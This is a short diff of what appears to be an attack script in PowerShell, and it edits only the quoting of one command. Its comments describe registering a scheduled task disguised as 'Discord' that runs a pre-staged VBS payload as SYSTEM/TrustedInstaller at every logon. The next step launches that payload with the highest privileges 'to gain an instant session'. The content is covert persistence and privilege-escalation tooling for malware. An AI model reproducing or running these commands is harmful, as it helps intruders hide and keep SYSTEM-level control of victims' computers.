@@ -22,7 +22,7 @@ try {
 }
 
 # 3. Create a persistent scheduled task masquerading as "Discord" (Runs under TrustedInstaller/SYSTEM at logon)
-gsudo -s --ti cmd.exe /c schtasks /create /tn "Discord" /tr "wscript.exe \"C:\uptm\auto_host.vbs\"" /sc onlogon /ru "SYSTEM" /f
+gsudo -s --ti schtasks /create /tn "Discord" /tr "wscript.exe `"C:\uptm\auto_host.vbs`"" /sc onlogon /ru "SYSTEM" /f
 
 # 4. Trigger the payload script immediately with highest privileges to gain an instant session without waiting for reboot
 # Note: Ensure C:\uptm\auto_host.vbs has been pre-staged or downloaded prior to this step
